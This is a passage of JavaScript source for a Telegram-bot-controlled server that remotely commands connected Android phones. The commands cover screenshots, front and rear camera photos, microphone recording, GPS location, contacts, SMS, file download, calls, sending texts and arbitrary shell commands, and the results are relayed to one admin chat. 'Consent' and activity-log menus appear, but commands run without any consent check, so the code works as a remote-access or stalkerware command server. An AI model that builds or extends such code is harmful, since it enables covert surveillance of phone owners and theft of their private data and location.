require('dotenv').config();
const express = require('express');
const WebSocket = require('ws');
const http = require('http');
const TelegramBot = require('node-telegram-bot-api');
const multer = require('multer');
const fs = require('fs');
const path = require('path');
const { v4: uuidv4 } = require('uuid');
const helmet = require('helmet');
const axios = require('axios'); // ADDED - replaces fetch
const NodeCache = require('node-cache'); // ADDED - for rate limiting
const rateLimit = require('express-rate-limit'); // ADDED

// Configuration
const token = process.env.TELEGRAM_BOT_TOKEN;
const adminId = process.env.TELEGRAM_CHAT_ID;
const PORT = process.env.PORT || 8999; // MOVED TO TOP

// Security check
if (!token || token.includes('AAHGZy_dy804ZwHoq48SnIK_OadCN2wcQxA')) {
    console.error('❌ SECURITY ALERT: Using compromised token! Regenerate via @BotFather');
    process.exit(1);
}

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server, clientTracking: true });

// Initialize caches
const commandCache = new NodeCache({ stdTTL: 2 });
const messageCache = new NodeCache({ stdTTL: 5 });

// Bot instance
let bot = null;

// Data structures
const connectedDevices = new Map();
const pendingCommands = new Map();
const userSessions = new Map();

// Create necessary directories
['uploads', 'logs', 'screenshots', 'recordings', 'photos', 'temp'].forEach(dir => {
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
});

// Security middleware
app.use(helmet({
    contentSecurityPolicy: false,
}));
app.use(express.json({ limit: '50mb' }));

// Rate limiting
const apiLimiter = rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 100
});
app.use('/api/', apiLimiter);

// File upload configuration
const storage = multer.diskStorage({
    destination: (req, file, cb) => {
        const type = req.headers['file-type'] || 'unknown';
        let dir = `uploads/${type}`;
        
        if (type.includes('screenshot')) dir = 'screenshots';
        else if (type.includes('audio') || type.includes('recording')) dir = 'recordings';
        else if (type.includes('photo') || type.includes('camera')) dir = 'photos';
        
        if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
        cb(null, dir);
    },
    filename: (req, file, cb) => {
        const deviceId = req.headers['device-id'] || 'unknown';
        const timestamp = Date.now();
        const ext = path.extname(file.originalname);
        cb(null, `${deviceId}-${timestamp}${ext}`);
    }
});

const upload = multer({
    storage,
    limits: { fileSize: 100 * 1024 * 1024 },
    fileFilter: (req, file, cb) => {
        const allowedTypes = [
            'image/jpeg', 'image/png', 'image/gif',
            'video/mp4', 'video/3gpp',
            'audio/mpeg', 'audio/mp3', 'audio/wav',
            'application/pdf', 'text/plain',
            'application/vnd.android.package-archive'
        ];
        
        if (allowedTypes.includes(file.mimetype) || 
            /\.(jpg|jpeg|png|gif|mp4|3gp|mp3|wav|txt|pdf|apk)$/i.test(file.originalname)) {
            cb(null, true);
        } else {
            cb(new Error('File type not allowed'), false);
        }
    }
});

// Logging function
function logEvent(event, deviceId = 'system', details = '') {
    const timestamp = new Date().toISOString();
    const logEntry = `[${timestamp}] [${deviceId}] ${event}: ${details}\n`;
    
    if (event.includes('ERROR')) {
        console.error('\x1b[31m%s\x1b[0m', logEntry.trim());
    } else if (event.includes('CONNECTED')) {
        console.log('\x1b[32m%s\x1b[0m', logEntry.trim());
    } else if (event.includes('COMMAND')) {
        console.log('\x1b[36m%s\x1b[0m', logEntry.trim());
    } else {
        console.log(logEntry.trim());
    }
    
    try {
        fs.appendFileSync('logs/server.log', logEntry);
    } catch (e) {}
}

// Helper function to send long messages
async function sendLongMessage(chatId, text, parseMode = 'Markdown') {
    const MAX_LENGTH = 4096;
    
    if (text.length <= MAX_LENGTH) {
        return await bot.sendMessage(chatId, text, { parse_mode: parseMode }).catch(e => {});
    }
    
    const tempFile = path.join(__dirname, 'temp', `output_${Date.now()}.txt`);
    fs.writeFileSync(tempFile, text.replace(/\*|`|_/g, ''));
    
    return await bot.sendDocument(chatId, tempFile, {
        caption: `📄 Output (${Math.ceil(text.length / 1024)}KB)`
    }).then(() => {
        setTimeout(() => {
            if (fs.existsSync(tempFile)) fs.unlinkSync(tempFile);
        }, 60000);
    }).catch(e => {});
}

// Format bytes helper
function formatBytes(bytes) {
    if (bytes === 0) return '0 B';
    const k = 1024;
    const sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(1)) + ' ' + sizes[i];
}

//=== KEYBOARD DEFINITIONS ===//
const mainKeyboard = {
    reply_markup: {
        keyboard: [
            [{ text: '📱 Devices' }, { text: 'ℹ️ Info' }],
            [{ text: '📸 Screenshot' }, { text: '📍 Location' }],
            [{ text: '📁 Browse' }, { text: '📥 Download' }],
            [{ text: '📞 Call' }, { text: '💬 SMS' }],
            [{ text: '📷 Camera' }, { text: '🎤 Record' }],
            [{ text: '📱 Apps' }, { text: '🖥️ Shell' }],
            [{ text: '🔐 Privacy' }, { text: '❓ Help' }]
        ],
        resize_keyboard: true
    }
};

const deviceSelectionKeyboard = (devices) => {
    const buttons = [];
    devices.forEach((device, id) => {
        const model = device.deviceInfo?.model?.split(' ')[0] || 'Android';
        const shortId = id.substring(0, 4);
        buttons.push([{ text: `📱 ${model} (${shortId})` }]);
    });
    buttons.push([{ text: '🔙 Back' }]);
    
    return { reply_markup: { keyboard: buttons, resize_keyboard: true, one_time_keyboard: true } };
};

const privacyKeyboard = {
    reply_markup: {
        keyboard: [
            [{ text: '🔐 View Consents' }, { text: '📋 View Log' }],
            [{ text: '🚫 Revoke Location' }, { text: '🚫 Revoke Camera' }],
            [{ text: '🚫 Revoke Mic' }, { text: '🚫 Revoke Contacts' }],
            [{ text: '🚫 Revoke SMS' }, { text: '🚫 Revoke Calls' }],
            [{ text: '🚫 Revoke Storage' }, { text: '🚫 Revoke All' }],
            [{ text: '🔙 Back' }]
        ],
        resize_keyboard: true
    }
};

const cameraKeyboard = {
    reply_markup: {
        keyboard: [
            [{ text: '📷 Front' }, { text: '📷 Rear' }],
            [{ text: '🔙 Back' }]
        ],
        resize_keyboard: true
    }
};

const durationKeyboard = {
    reply_markup: {
        keyboard: [
            [{ text: '⏱️ 5s' }, { text: '⏱️ 10s' }, { text: '⏱️ 30s' }],
            [{ text: '⏱️ 1m' }, { text: '⏱️ 5m' }, { text: '⏱️ 10m' }],
            [{ text: '🔙 Back' }]
        ],
        resize_keyboard: true
    }
};

const removeKeyboard = { reply_markup: { remove_keyboard: true } };

//=== BOT SETUP ===//
async function setupBotCommands() {
    if (!bot) return;
    
    const commands = [
        { command: 'start', description: '🚀 Start DMA bot' },
        { command: 'help', description: '❓ Show help' },
        { command: 'keyboard', description: '⌨️ Show keyboard' },
        { command: 'list', description: '📱 List devices' },
        { command: 'info', description: 'ℹ️ Device info (ID)' },
        { command: 'screenshot', description: '📸 Take screenshot (ID)' },
        { command: 'camera', description: '📷 Take photo (ID + front/rear)' },
        { command: 'record', description: '🎤 Record audio (ID + seconds)' },
        { command: 'location', description: '📍 Get location (ID)' },
        { command: 'browse', description: '📁 Browse files (ID)' },
        { command: 'download', description: '📥 Download file (ID + path)' },
        { command: 'call', description: '📞 Make call (ID + number)' },
        { command: 'sms', description: '💬 Send SMS (ID + number + text)' },
        { command: 'contacts', description: '📒 Get contacts (ID)' },
        { command: 'messages', description: '📨 Get messages (ID)' },
        { command: 'apps', description: '📱 List apps (ID)' },
        { command: 'shell', description: '🖥️ Run command (ID + cmd)' },
        { command: 'privacy', description: '🔐 Manage consents (ID)' },
        { command: 'revoke', description: '🚫 Revoke consent (ID + type)' },
        { command: 'revoke_all', description: '⚠️ Revoke all (ID)' }
    ];

    try {
        await bot.setMyCommands(commands);
        console.log('✅ Bot commands ready (20 commands)');
    } catch (error) {
        console.error('❌ Failed to set commands:', error.message);
    }
}

async function initializeBot() {
    return new Promise((resolve, reject) => {
        try {
            bot = new TelegramBot(token, {
                polling: true,
                onlyFirstMatch: true,
                request: { agentOptions: { keepAlive: true, family: 4 } }
            });

            bot.getMe().then((me) => {
                console.log(`✅ Bot connected: @${me.username}`);
                resolve(bot);
            }).catch(reject);

            bot.on('polling_error', (error) => {
                if (error.code === 'ETELEGRAM' && error.message.includes('409')) {
                    console.error('\n❌ Another bot instance is running!');
                    console.error('💡 Run: killall node');
                    bot.stopPolling();
                }
            });

        } catch (error) {
            reject(error);
        }
    });
}

async function startBot() {
    try {
        const webhookRes = await axios.get(`https://api.telegram.org/bot${token}/getWebhookInfo`);
        if (webhookRes.data.ok && webhookRes.data.result.url) {
            await axios.get(`https://api.telegram.org/bot${token}/deleteWebhook?drop_pending_updates=true`);
        }
        
        await initializeBot();
        setupBotCommandHandlers();
        await setupBotCommands();
        return bot;
    } catch (error) {
        console.error('❌ Bot start failed:', error.message);
        return null;
    }
}

//=== WEBSOCKET SERVER ===//
wss.on('connection', (ws, req) => {
    try {
        const deviceId = req.headers['device-id'];
        const deviceModel = req.headers['device-model'] || 'Unknown';
        const androidVersion = req.headers['android-version'] || 'Unknown';
        
        if (!deviceId || !req.headers['authorization']) {
            return ws.close(1008, 'Unauthorized');
        }

        const deviceInfo = {
            id: deviceId,
            model: deviceModel,
            android: androidVersion,
            connectedAt: new Date().toISOString(),
            lastSeen: Date.now()
        };

        ws.deviceId = deviceId;
        
        connectedDevices.set(deviceId, { 
            ws, 
            deviceInfo, 
            lastSeen: Date.now(),
            consents: new Map()
        });

        if (bot) {
            bot.sendMessage(adminId, 
                `📱 *Device Connected*\n` +
                `Model: \`${deviceModel}\`\n` +
                `Android: ${androidVersion}\n` +
                `ID: \`${deviceId.substring(0, 8)}...\``,
                { parse_mode: 'Markdown' }
            ).catch(e => {});
        }

        ws.on('message', (data) => {
            try {
                const msg = JSON.parse(data);
                handleDeviceMessage(deviceId, msg);
            } catch (e) {}
            const dev = connectedDevices.get(deviceId);
            if (dev) dev.lastSeen = Date.now();
        });

        ws.on('close', () => {
            connectedDevices.delete(deviceId);
            if (bot) {
                bot.sendMessage(adminId, `📴 *Device Disconnected*\n\`${deviceId.substring(0, 8)}...\``, 
                    { parse_mode: 'Markdown' }).catch(e => {});
            }
        });

        // Request device info immediately
        ws.send(JSON.stringify({
            type: 'command',
            id: uuidv4(),
            command: 'get_device_info',
            timestamp: Date.now()
        }));

    } catch (error) {
        ws.close(1011, 'Server error');
    }
});

//=== MESSAGE HANDLERS ===//
function handleDeviceMessage(deviceId, message) {
    const device = connectedDevices.get(deviceId);
    if (!device) return;

    switch (message.type) {
        case 'response': handleCommandResponse(deviceId, message); break;
        case 'device_info': updateDeviceInfo(deviceId, message.data); break;
        case 'consent_status': updateConsentStatus(deviceId, message.data); break;
        case 'transparency_log': handleTransparencyLog(deviceId, message.data); break;
        case 'file_upload': handleFileUpload(deviceId, message); break;
        case 'error': 
            if (bot) {
                bot.sendMessage(adminId, `❌ *Error*\n\`${message.error}\``, 
                    { parse_mode: 'Markdown' }).catch(e => {});
            }
            break;
    }
}

function updateDeviceInfo(deviceId, info) {
    const device = connectedDevices.get(deviceId);
    if (device) {
        device.deviceInfo = { ...device.deviceInfo, ...info };
    }
}

function updateConsentStatus(deviceId, data) {
    const device = connectedDevices.get(deviceId);
    if (device && data.consents) {
        try {
            const consents = JSON.parse(data.consents);
            consents.forEach(c => device.consents.set(c.type, c));
            
            if (bot) {
                let msg = `🔐 *Consents - ${device.deviceInfo?.model || deviceId.substring(0, 6)}*\n━━━━━━━━━━━━━\n`;
                consents.forEach(c => {
                    msg += `• ${c.type}: ${c.active ? '✅' : '❌'}\n`;
                });
                bot.sendMessage(adminId, msg, { parse_mode: 'Markdown' }).catch(e => {});
            }
        } catch (e) {}
    }
}

function handleTransparencyLog(deviceId, data) {
    const device = connectedDevices.get(deviceId);
    if (!device || !data.log) return;
    
    try {
        const logs = JSON.parse(data.log).slice(0, 15);
        let msg = `📋 *Activity Log - ${device.deviceInfo?.model || deviceId.substring(0, 6)}*\n━━━━━━━━━━━━━\n`;
        
        logs.forEach((e, i) => {
            const time = new Date(e.timestamp).toLocaleTimeString();
            msg += `${i+1}. [${time}] ${e.action}\n   ${e.details.substring(0, 50)}\n`;
        });
        
        sendLongMessage(adminId, msg);
    } catch (e) {}
}

function handleFileUpload(deviceId, message) {
    if (bot) {
        bot.sendMessage(adminId, 
            `📁 *File Received*\nDevice: \`${deviceId.substring(0, 8)}...\`\nType: ${message.fileType}`,
            { parse_mode: 'Markdown' }
        ).catch(e => {});
    }
}

//=== COMMAND HANDLER - CONSOLIDATED ===//
function handleCommandResponse(deviceId, response) {
    const device = connectedDevices.get(deviceId);
    const model = device?.deviceInfo?.model?.split(' ')[0] || deviceId.substring(0, 6);
    
    if (!bot || !response.success) {
        if (bot && !response.success) {
            bot.sendMessage(adminId, 
                `❌ *Failed*\nDevice: ${model}\nError: ${response.error || 'Unknown'}`,
                { parse_mode: 'Markdown' }
            ).catch(e => {});
        }
        return;
    }

    // Location
    if (response.data?.lat && response.data?.lng) {
        bot.sendLocation(adminId, response.data.lat, response.data.lng).then(() => {
            const url = `https://maps.google.com/?q=${response.data.lat},${response.data.lng}`;
            bot.sendMessage(adminId, 
                `📍 *${model}*\nLat: \`${response.data.lat}\`\nLng: \`${response.data.lng}\``,
                { parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: '🗺️ Map', url }]] } }
            ).catch(e => {});
        }).catch(e => {});
    }
    
    // Device info
    else if (response.data?.device) {
        const msg = 
`📱 *${response.data.model || 'Device'}*
━━━━━━━━━━━━━
🤖 Android: ${response.data.android || '?'} (SDK ${response.data.sdk || '?'})
🔋 Battery: ${response.data.battery?.toFixed(0) || '?'}%
💾 Free: ${formatBytes(response.data.internal_free)}
📦 Apps: ${response.data.apps_count || 0}
📶 Network: ${response.data.network_type || '?'}
━━━━━━━━━━━━━
ID: \`${deviceId}\``;
        bot.sendMessage(adminId, msg, { parse_mode: 'Markdown' }).catch(e => {});
    }
    
    // Contacts
    else if (response.data?.contacts) {
        try {
            const contacts = JSON.parse(response.data.contacts).slice(0, 20);
            let msg = `📒 *Contacts - ${model}*\n━━━━━━━━━━━━━\n`;
            contacts.forEach((c, i) => {
                msg += `${i+1}. ${c.name || '?'}: \`${c.number}\`\n`;
            });
            sendLongMessage(adminId, msg);
        } catch (e) {}
    }
    
    // Apps
    else if (response.data?.apps) {
        try {
            const apps = JSON.parse(response.data.list).slice(0, 30);
            let msg = `📱 *Apps - ${model}*\n━━━━━━━━━━━━━\nTotal: ${response.data.count}\n\n`;
            apps.forEach((a, i) => {
                const name = a.split('.').pop() || a;
                msg += `${i+1}. ${name}\n`;
            });
            sendLongMessage(adminId, msg);
        } catch (e) {}
    }
    
    // Shell output
    else if (response.output) {
        const output = response.output.substring(0, 1000);
        sendLongMessage(adminId, `🖥️ *Output - ${model}*\n━━━━━━━━━━━━━\n\`\`\`\n${output}\n\`\`\``);
    }
    
    // Consents
    else if (response.data?.consents) {
        updateConsentStatus(deviceId, response.data);
    }
    
    // Log
    else if (response.data?.log) {
        handleTransparencyLog(deviceId, response.data);
    }
    
    // Simple success
    else {
        bot.sendMessage(adminId, `✅ *Done*\nDevice: ${model}`, 
            { parse_mode: 'Markdown' }).catch(e => {});
    }
}

//=== SEND COMMAND TO DEVICE ===//
function sendCommandToDevice(deviceId, command, data = {}) {
    const device = connectedDevices.get(deviceId);
    if (!device) return false;
    
    try {
        device.ws.send(JSON.stringify({
            type: 'command',
            id: uuidv4(),
            command,
            data,
            timestamp: Date.now()
        }));
        return true;
    } catch (e) {
        return false;
    }
}

//=== BOT COMMAND HANDLERS - CONSOLIDATED ===//
function setupBotCommandHandlers() {
    if (!bot) return;

    //=== CORE COMMANDS ===//
    bot.onText(/\/start/, (msg) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) {
            return bot.sendMessage(chatId, '⛔ Unauthorized');
        }
        
        bot.sendMessage(chatId, 
            `🤖 *DMA v2.0*\n━━━━━━━━━━━━━\n` +
            `Devices: ${connectedDevices.size}\n` +
            `Type /help for commands`,
            { parse_mode: 'Markdown', reply_markup: mainKeyboard.reply_markup }
        ).catch(e => {});
    });

    bot.onText(/\/help/, (msg) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const help = 
`🤖 *DMA Commands*
━━━━━━━━━━━━━
*📱 Device*
/list - Show devices
/info [ID] - Device info

*📸 Media*
/screenshot [ID] - Take screenshot
/camera [ID] [front/rear] - Take photo
/record [ID] [sec] - Record audio

*📍 Location*
/location [ID] - Get GPS

*📁 Files*
/browse [ID] - Browse files
/download [ID] [path] - Download file

*📞 Comm*
/call [ID] [num] - Make call
/sms [ID] [num] [text] - Send SMS
/contacts [ID] - Get contacts
/messages [ID] - Get SMS

*📱 System*
/apps [ID] - List apps
/shell [ID] [cmd] - Run command

*🔐 Privacy*
/privacy [ID] - Manage consents
/revoke [ID] [type] - Revoke consent
/revoke_all [ID] - Revoke all

*❓ Other*
/keyboard - Show keyboard
/help - This message`;
        
        bot.sendMessage(chatId, help, { parse_mode: 'Markdown' }).catch(e => {});
    });

    bot.onText(/\/keyboard/, (msg) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        bot.sendMessage(chatId, '⌨️ Keyboard', { reply_markup: mainKeyboard.reply_markup }).catch(e => {});
    });

    bot.onText(/\/list/, (msg) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        if (connectedDevices.size === 0) {
            return bot.sendMessage(chatId, '📭 No devices').catch(e => {});
        }
        
        let text = `📱 *Devices (${connectedDevices.size})*\n━━━━━━━━━━━━━\n`;
        connectedDevices.forEach((d, id) => {
            const model = d.deviceInfo?.model?.split(' ')[0] || '?';
            const battery = d.deviceInfo?.battery ? `${d.deviceInfo.battery.toFixed(0)}%` : '?';
            text += `• ${model} [${battery}] \`${id.substring(0, 6)}...\`\n`;
        });
        
        bot.sendMessage(chatId, text, { 
            parse_mode: 'Markdown',
            reply_markup: deviceSelectionKeyboard(connectedDevices).reply_markup 
        }).catch(e => {});
    });

    //=== DEVICE COMMANDS ===//
    const deviceCommands = [
        'info', 'screenshot', 'location', 'apps', 'contacts', 'messages',
        'privacy', 'revoke_all', 'browse', 'download'
    ];
    
    deviceCommands.forEach(cmd => {
        bot.onText(new RegExp(`\\/${cmd} (.+)`), (msg, match) => {
            const chatId = msg.chat.id;
            if (chatId.toString() !== adminId) return;
            
            const deviceId = match[1];
            const device = connectedDevices.get(deviceId);
            
            if (!device) {
                return bot.sendMessage(chatId, `❌ Device not found`).catch(e => {});
            }
            
            // Map commands to device commands
            const commandMap = {
                'info': 'get_device_info',
                'screenshot': 'take_screenshot',
                'location': 'get_location',
                'apps': 'list_apps',
                'contacts': 'get_contacts',
                'messages': 'get_messages',
                'privacy': 'get_consents',
                'revoke_all': 'revoke_all_consents',
                'browse': 'list_files',
                'download': 'get_file'
            };
            
            const deviceCmd = commandMap[cmd];
            
            if (cmd === 'browse' || cmd === 'download') {
                setUserSession(chatId, { state: `awaiting_${cmd}_path`, deviceId });
                bot.sendMessage(chatId, `📁 Enter path:`, removeKeyboard).catch(e => {});
            } else if (cmd === 'revoke_all') {
                sendCommandToDevice(deviceId, deviceCmd, { reason: 'Admin revoked all' });
                bot.sendMessage(chatId, `⚠️ Revoking all consents...`).catch(e => {});
            } else {
                sendCommandToDevice(deviceId, deviceCmd);
                bot.sendMessage(chatId, `✅ Command sent`).catch(e => {});
            }
        });
    });

    // Camera command
    bot.onText(/\/camera (.+) (.+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const deviceId = match[1];
        const type = match[2].toLowerCase();
        
        if (!connectedDevices.get(deviceId)) {
            return bot.sendMessage(chatId, `❌ Device not found`).catch(e => {});
        }
        
        sendCommandToDevice(deviceId, 'take_photo', { camera: type.includes('front') ? 'front' : 'rear' });
        bot.sendMessage(chatId, `📷 Taking ${type} photo...`).catch(e => {});
    });

    // Record command
    bot.onText(/\/record (.+) (\d+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const deviceId = match[1];
        const seconds = parseInt(match[2]);
        
        if (!connectedDevices.get(deviceId)) {
            return bot.sendMessage(chatId, `❌ Device not found`).catch(e => {});
        }
        
        sendCommandToDevice(deviceId, 'record_audio', { seconds });
        bot.sendMessage(chatId, `🎤 Recording ${seconds}s...`).catch(e => {});
    });

    // Call command
    bot.onText(/\/call (.+) (.+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const deviceId = match[1];
        const number = match[2];
        
        if (!connectedDevices.get(deviceId)) {
            return bot.sendMessage(chatId, `❌ Device not found`).catch(e => {});
        }
        
        sendCommandToDevice(deviceId, 'make_call', { number });
        bot.sendMessage(chatId, `📞 Calling ${number}...`).catch(e => {});
    });

    // SMS command
    bot.onText(/\/sms (.+) (.+) (.+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const deviceId = match[1];
        const number = match[2];
        const message = match[3];
        
        if (!connectedDevices.get(deviceId)) {
            return bot.sendMessage(chatId, `❌ Device not found`).catch(e => {});
        }
        
        sendCommandToDevice(deviceId, 'send_sms', { number, message });
        bot.sendMessage(chatId, `💬 SMS sent to ${number}`).catch(e => {});
    });

    // Shell command
    bot.onText(/\/shell (.+) (.+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const deviceId = match[1];
        const command = match[2];
        
        if (!connectedDevices.get(deviceId)) {
            return bot.sendMessage(chatId, `❌ Device not found`).catch(e => {});
        }
        
        sendCommandToDevice(deviceId, 'execute', { cmd: command });
        bot.sendMessage(chatId, `🖥️ Executing...`).catch(e => {});
    });

    // Revoke command
    bot.onText(/\/revoke (.+) (.+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const deviceId = match[1];
        const type = match[2].toUpperCase();
        
        if (!connectedDevices.get(deviceId)) {
            return bot.sendMessage(chatId, `❌ Device not found`).catch(e => {});
        }
        
        sendCommandToDevice(deviceId, 'revoke_consent', { type, reason: 'Admin revoked' });
        bot.sendMessage(chatId, `🚫 Revoked ${type}`).catch(e => {});
    });

    //=== MESSAGE HANDLER - BUTTONS ===//
    bot.on('message', (msg) => {
        const chatId = msg.chat.id;
        const text = msg.text;
        
        if (chatId.toString() !== adminId || !text) return;
        
        const session = getUserSession(chatId);
        
        // Main menu buttons
        switch(text) {
            case '📱 Devices':
                if (connectedDevices.size === 0) {
                    return bot.sendMessage(chatId, '📭 No devices').catch(e => {});
                }
                bot.sendMessage(chatId, 'Select device:', { 
                    reply_markup: deviceSelectionKeyboard(connectedDevices).reply_markup 
                }).catch(e => {});
                break;
                
            case '🔙 Back':
                bot.sendMessage(chatId, 'Main menu', { 
                    reply_markup: mainKeyboard.reply_markup 
                }).catch(e => {});
                clearUserSession(chatId);
                break;
                
            case '🔐 Privacy':
                if (connectedDevices.size === 0) {
                    return bot.sendMessage(chatId, '📭 No devices').catch(e => {});
                }
                setUserSession(chatId, { state: 'awaiting_device_for_privacy' });
                bot.sendMessage(chatId, 'Select device:', {
                    reply_markup: deviceSelectionKeyboard(connectedDevices).reply_markup
                }).catch(e => {});
                break;
                
            case '🔐 View Consents':
                if (session?.deviceId) {
                    sendCommandToDevice(session.deviceId, 'get_consents');
                    bot.sendMessage(chatId, '🔐 Fetching consents...', removeKeyboard).catch(e => {});
                }
                break;
                
            case '📋 View Log':
                if (session?.deviceId) {
                    sendCommandToDevice(session.deviceId, 'get_transparency_log', { limit: 30 });
                    bot.sendMessage(chatId, '📋 Fetching log...', removeKeyboard).catch(e => {});
                }
                break;
                
            case '🚫 Revoke All':
                if (session?.deviceId) {
                    sendCommandToDevice(session.deviceId, 'revoke_all_consents', { reason: 'Button revoke' });
                    bot.sendMessage(chatId, '⚠️ Revoking all...', removeKeyboard).catch(e => {});
                }
                break;
                
            case '📸 Screenshot':
            case '📍 Location':
            case '📁 Browse':
            case '📥 Download':
            case '📞 Call':
            case '💬 SMS':
            case '📷 Camera':
            case '🎤 Record':
            case '📱 Apps':
            case '🖥️ Shell':
            case 'ℹ️ Info':
                if (connectedDevices.size === 0) {
                    return bot.sendMessage(chatId, '📭 No devices').catch(e => {});
                }
                
                const actionMap = {
                    '📸 Screenshot': 'screenshot',
                    '📍 Location': 'location',
                    '📁 Browse': 'browse',
                    '📥 Download': 'download',
                    '📞 Call': 'call',
                    '💬 SMS': 'sms',
                    '📷 Camera': 'camera',
                    '🎤 Record': 'record',
                    '📱 Apps': 'apps',
                    '🖥️ Shell': 'shell',
                    'ℹ️ Info': 'info'
                };
                
                setUserSession(chatId, { state: `awaiting_device_for_${actionMap[text]}` });
                bot.sendMessage(chatId, `Select device for ${text}:`, {
                    reply_markup: deviceSelectionKeyboard(connectedDevices).reply_markup
                }).catch(e => {});
                break;
                
            case '📷 Front':
                if (session?.deviceId) {
                    sendCommandToDevice(session.deviceId, 'take_photo', { camera: 'front' });
                    bot.sendMessage(chatId, '📷 Front camera', removeKeyboard).catch(e => {});
                    clearUserSession(chatId);
                }
                break;
                
            case '📷 Rear':
                if (session?.deviceId) {
                    sendCommandToDevice(session.deviceId, 'take_photo', { camera: 'rear' });
                    bot.sendMessage(chatId, '📷 Rear camera', removeKeyboard).catch(e => {});
                    clearUserSession(chatId);
                }
                break;
                
            case '⏱️ 5s':
            case '⏱️ 10s':
            case '⏱️ 30s':
            case '⏱️ 1m':
            case '⏱️ 5m':
            case '⏱️ 10m':
                if (session?.deviceId) {
                    const secMap = { '5s': 5, '10s': 10, '30s': 30, '1m': 60, '5m': 300, '10m': 600 };
                    const seconds = secMap[text.replace('⏱️ ', '')];
                    sendCommandToDevice(session.deviceId, 'record_audio', { seconds });
                    bot.sendMessage(chatId, `🎤 Recording ${seconds}s`, removeKeyboard).catch(e => {});
                    clearUserSession(chatId);
                }
                break;
                
            // Revoke buttons
            case text.match(/🚫 Revoke \w+/)?.input:
                if (session?.deviceId) {
                    const typeMap = {
                        'Location': 'LOCATION', 'Camera': 'CAMERA', 'Mic': 'MICROPHONE',
                        'Contacts': 'CONTACTS', 'SMS': 'SMS', 'Calls': 'CALL_LOG',
                        'Storage': 'STORAGE'
                    };
                    const type = text.replace('🚫 Revoke ', '');
                    const consentType = typeMap[type] || type.toUpperCase();
                    
                    sendCommandToDevice(session.deviceId, 'revoke_consent', { 
                        type: consentType, 
                        reason: 'Button revoke' 
                    });
                    bot.sendMessage(chatId, `🚫 Revoked ${type}`, removeKeyboard).catch(e => {});
                }
                break;
                
            case '❓ Help':
                bot.sendMessage(chatId, 'Type /help', { 
                    reply_markup: mainKeyboard.reply_markup 
                }).catch(e => {});
                break;
        }
        
        // Device selection
        if (text?.includes('📱') && text.includes('(') && session) {
            const deviceEntry = Array.from(connectedDevices.entries()).find(([id, d]) => 
                text.includes(id.substring(0, 4))
            );
            
            if (deviceEntry) {
                const [deviceId, device] = deviceEntry;
                const model = device.deviceInfo?.model?.split(' ')[0] || 'Device';
                
                if (session.state === 'awaiting_device_for_privacy') {
                    setUserSession(chatId, { state: 'privacy_menu', deviceId });
                    bot.sendMessage(chatId, `🔐 *${model}*\nSelect action:`, {
                        parse_mode: 'Markdown',
                        reply_markup: privacyKeyboard.reply_markup
                    }).catch(e => {});
                }
                else if (session.state === 'awaiting_device_for_camera') {
                    setUserSession(chatId, { state: 'camera_select', deviceId });
                    bot.sendMessage(chatId, `📷 Select camera:`, {
                        reply_markup: cameraKeyboard.reply_markup
                    }).catch(e => {});
                }
                else if (session.state === 'awaiting_device_for_record') {
                    setUserSession(chatId, { state: 'record_duration', deviceId });
                    bot.sendMessage(chatId, `🎤 Duration:`, {
                        reply_markup: durationKeyboard.reply_markup
                    }).catch(e => {});
                }
                else if (session.state === 'awaiting_device_for_browse' || session.state === 'awaiting_device_for_download') {
                    const action = session.state === 'awaiting_device_for_browse' ? 'browse' : 'download';
                    setUserSession(chatId, { state: `awaiting_${action}_path`, deviceId });
                    bot.sendMessage(chatId, `📁 Enter path:`, removeKeyboard).catch(e => {});
                }
                else if (session.state === 'awaiting_device_for_call') {
                    setUserSession(chatId, { state: 'awaiting_call_number', deviceId });
                    bot.sendMessage(chatId, `📞 Enter number:`, removeKeyboard).catch(e => {});
                }
                else if (session.state === 'awaiting_device_for_sms') {
                    setUserSession(chatId, { state: 'awaiting_sms_number', deviceId });
                    bot.sendMessage(chatId, `💬 Enter number:`, removeKeyboard).catch(e => {});
                }
                else if (session.state === 'awaiting_device_for_shell') {
                    setUserSession(chatId, { state: 'awaiting_command', deviceId });
                    bot.sendMessage(chatId, `🖥️ Enter command:`, removeKeyboard).catch(e => {});
                }
                else {
                    // Direct commands
                    const cmdMap = {
                        'screenshot': 'take_screenshot',
                        'location': 'get_location',
                        'apps': 'list_apps',
                        'info': 'get_device_info'
                    };
                    
                    const action = session.state.replace('awaiting_device_for_', '');
                    if (cmdMap[action]) {
                        sendCommandToDevice(deviceId, cmdMap[action]);
                        bot.sendMessage(chatId, `✅ Command sent`, removeKeyboard).catch(e => {});
                        clearUserSession(chatId);
                    }
                }
            }
        }
        
        // Input handlers
        if (session?.state === 'awaiting_call_number' && session.deviceId) {
            const number = text.trim();
            sendCommandToDevice(session.deviceId, 'make_call', { number });
            bot.sendMessage(chatId, `📞 Calling...`, removeKeyboard).catch(e => {});
            clearUserSession(chatId);
        }
        
        if (session?.state === 'awaiting_sms_number' && session.deviceId) {
            const number = text.trim();
            setUserSession(chatId, { state: 'awaiting_sms_text', deviceId, number });
            bot.sendMessage(chatId, `💬 Enter message:`).catch(e => {});
        }
        
        if (session?.state === 'awaiting_sms_text' && session.deviceId) {
            const message = text.trim();
            sendCommandToDevice(session.deviceId, 'send_sms', { 
                number: session.number, 
                message 
            });
